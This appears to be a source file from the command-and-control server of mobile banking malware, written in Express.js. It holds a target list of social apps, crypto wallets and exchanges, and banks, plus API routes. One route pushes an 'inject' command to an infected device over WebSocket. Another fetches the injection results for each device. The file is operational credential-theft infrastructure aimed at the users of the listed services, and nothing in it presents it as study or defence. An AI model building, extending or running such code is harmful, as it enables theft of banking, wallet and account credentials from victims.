import express from 'express';
import { addInjection, getInjections } from '../models/Injection.js';
const router = express.Router();

const TARGETS = {
  social: [
    { id: 'wechat', name: '微信', icon: '💬' },
    { id: 'tiktok', name: 'TikTok', icon: '🎵' },
    { id: 'xiaohongshu', name: '小红书', icon: '📕' },
    { id: 'qq', name: 'QQ', icon: '🐧' },
    { id: 'taobao', name: '淘宝', icon: '🛒' },
    { id: 'weibo', name: '微博', icon: '👁' },
    { id: 'viber', name: 'Viber', icon: '📞' },
    { id: 'vk', name: 'VK', icon: '🔷' },
    { id: 'gmail', name: 'Gmail', icon: '📧' },
    { id: 'facebook', name: 'Facebook', icon: 'f' },
    { id: 'instagram', name: 'Instagram', icon: '📷' },
    { id: 'discord', name: 'Discord', icon: '🎮' },
    { id: 'snapchat', name: 'Snapchat', icon: '👻' },
    { id: 'x', name: 'X', icon: '𝕏' },
    { id: 'pinterest', name: 'Pinterest', icon: '📌' },
    { id: 'whatsapp', name: 'WhatsApp', icon: '💚' },
    { id: 'bluesky', name: 'Bluesky', icon: '🦋' },
    { id: 'element', name: 'Element', icon: '🔐' }
  ],
  crypto: [
    { id: 'binance', name: 'Binance', icon: '◆' },
    { id: 'coinbase', name: 'Coinbase', icon: '◎' },
    { id: 'metamask', name: 'Metamask', icon: '🦊' },
    { id: 'bitget', name: 'Bitget', icon: '◈' },
    { id: 'phantom', name: 'Phantom', icon: '👻' },
    { id: 'trustwallet', name: 'Trust Wallet', icon: '🔵' },
    { id: 'moonpay', name: 'Moonpay', icon: '🌙' },
    { id: 'exodus', name: 'Exodus', icon: '⧫' },
    { id: 'dydx', name: 'DYDX', icon: 'X' },
    { id: 'jaxx', name: 'JAXX Liberty', icon: 'J' },
    { id: 'bybit', name: 'Bybit', icon: 'B' },
    { id: 'htx', name: 'HTX', icon: 'H' },
    { id: 'okx', name: 'OKX', icon: '◼' },
    { id: 'atomic', name: 'Atomic', icon: '⚛' },
    { id: 'blockchain', name: 'Blockchain.com', icon: '⬡' },
    { id: 'coinomi', name: 'Coinomi', icon: '◎' },
    { id: 'cryptocom', name: 'Crypto.com', icon: '⬢' },
    { id: 'edge', name: 'Edge', icon: '▲' }
  ],
  finance: [
    { id: 'airstar', name: 'AirStar', icon: '✈' },
    { id: 'alipay', name: 'Ali Pay', icon: '支' },
    { id: 'boc', name: 'BOC', icon: '🏦' },
    { id: 'hsbc', name: 'HSBC Singapore', icon: '◆' },
    { id: 'chase', name: 'Chase', icon: 'C' },
    { id: 'revolut', name: 'Revolut', icon: 'R' },
    { id: 'alfabank', name: 'Alfa Bank Belarus', icon: 'A' },
    { id: 'paypal', name: 'Paypal', icon: 'P' },
    { id: 'googlewallet', name: 'Google Wallet', icon: 'G' },
    { id: 'samsungwallet', name: 'Samsung Wallet', icon: 'S' },
    { id: 'allybank', name: 'AllyBank', icon: '◆' },
    { id: 'bluevine', name: 'BluevineBank', icon: 'B' },
    { id: 'capitalone', name: 'CapitalOne', icon: 'C' },
    { id: 'chime', name: 'ChimeBank', icon: '◈' },
    { id: 'creditone', name: 'CreditOne', icon: '◉' },
    { id: 'currencyfair', name: 'CurrencyFair', icon: '⚖' },
    { id: 'discover', name: 'DiscoverBank', icon: 'D' },
    { id: 'greenfi', name: 'GREENFI', icon: 'F' }
  ]
};

router.get('/targets', (req, res) => {
  res.json({
    social: { count: TARGETS.social.length, targets: TARGETS.social },
    crypto: { count: TARGETS.crypto.length, targets: TARGETS.crypto },
    finance: { count: TARGETS.finance.length, targets: TARGETS.finance }
  });
});

router.post('/:deviceId', async (req, res) => {
  const { targets, category } = req.body;
  const device = req.app.locals.connectedDevices.get(req.params.deviceId);
  if (!device) return res.status(404).json({ error: 'Device offline' });

  for (const t of targets) await addInjection(req.params.deviceId, t, category);

  device.ws.send(JSON.stringify({ type: 'command', command: 'inject', payload: { targets, category } }));
  res.json({ sent: true, count: targets.length });
});

router.get('/results/:deviceId', async (req, res) => {
  try {
    const rows = await getInjections(req.params.deviceId);
    res.json(rows);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

export default router;
